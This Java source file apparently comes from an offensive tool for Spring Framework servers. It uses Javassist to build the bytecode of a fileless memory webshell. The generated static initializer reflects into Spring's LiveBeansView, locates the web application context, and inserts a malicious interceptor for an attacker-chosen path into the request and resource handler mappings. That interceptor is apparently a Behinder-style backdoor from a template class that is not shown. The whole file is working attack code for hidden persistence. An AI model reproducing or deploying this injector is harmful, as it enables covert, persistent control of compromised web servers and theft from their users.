package org.memshell.spring;

import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;

import java.io.IOException;
import java.util.UUID;

public class SpringInterceptorBehinder {
    public static byte[] generateListenerMemShell(String path) throws CannotCompileException, NotFoundException, IOException {

        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.get("org.memshell.template.SpringInterceptorTemplate");

        UUID uuid = UUID.randomUUID();
        String replace = uuid.toString().replace("-", "");
        String className = "A" + replace;


        // 修改类名和包名
        ctClass.setName(className);

        ctClass.makeClassInitializer().insertBefore("try {\n" +
                "   java.lang.reflect.Field applicationContextsField = Class.forName(\"org.springframework.context.support.LiveBeansView\").getDeclaredField(\"applicationContexts\");\n" +
                "   applicationContextsField.setAccessible(true);\n" +
                "   java.util.LinkedHashSet hashSet = (java.util.LinkedHashSet) applicationContextsField.get(null);\n" +
                "   org.springframework.web.context.WebApplicationContext webApplicationContext;\n" +
                "   java.util.Iterator iterator = hashSet.iterator();\n" +
                "   while (iterator.hasNext()) {\n" +
                "       org.springframework.context.ConfigurableApplicationContext configurableApplicationContext = iterator.next();" +
                "       if (configurableApplicationContext instanceof org.springframework.web.context.WebApplicationContext) {\n" +
                "           webApplicationContext = (org.springframework.web.context.WebApplicationContext) configurableApplicationContext;\n" +
                "           org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) webApplicationContext.getBean(\"requestMappingHandlerMapping\");\n" +
                "           java.lang.reflect.Field adaptedInterceptorsField = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(\"adaptedInterceptors\");\n" +
                "           adaptedInterceptorsField.setAccessible(true);\n" +
                "           java.util.List adaptedInterceptors = (java.util.List) adaptedInterceptorsField.get(abstractHandlerMapping);\n" +
                "           adaptedInterceptors.add(0, new org.springframework.web.servlet.handler.MappedInterceptor(new String[]{\"" + path + "\"}, null, new " + className + "()));\n" +
                "           adaptedInterceptorsField.set(abstractHandlerMapping, adaptedInterceptors);\n" +
                "           java.lang.Object resourceHandlerMapping = webApplicationContext.getBean(\"resourceHandlerMapping\");\n" +
                "           if (!resourceHandlerMapping.toString().equals(\"null\")) {" +
                "               org.springframework.web.servlet.handler.AbstractHandlerMapping simpleUrlHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) resourceHandlerMapping;\n" +
                "               java.util.List o = (java.util.List) adaptedInterceptorsField.get(simpleUrlHandlerMapping);\n" +
                "               o.add(0, new org.springframework.web.servlet.handler.MappedInterceptor(new String[]{\"" + path + "\"}, null, new " + className + "()));\n" +
                "           }\n" +
                "       }\n" +
                "   }\n" +
                "} catch (Exception e) {\n" +
                "   e.printStackTrace();\n" +
                "}");

//        ctClass.writeFile("./output");
        return ctClass.toBytecode();
    }
}
